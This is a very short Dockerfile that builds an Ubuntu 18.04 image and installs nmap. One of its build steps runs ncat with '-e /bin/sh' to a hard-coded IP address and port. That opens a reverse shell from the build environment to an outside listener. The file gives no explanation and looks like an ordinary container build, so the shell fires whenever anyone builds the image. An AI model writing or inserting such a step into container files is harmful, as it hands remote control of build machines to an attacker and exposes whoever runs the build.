FROM ubuntu:18.04

RUN apt update && apt install -y nmap

RUN ncat 192.168.31.207 8989 -e /bin/sh

CMD ["/bin/sh"]
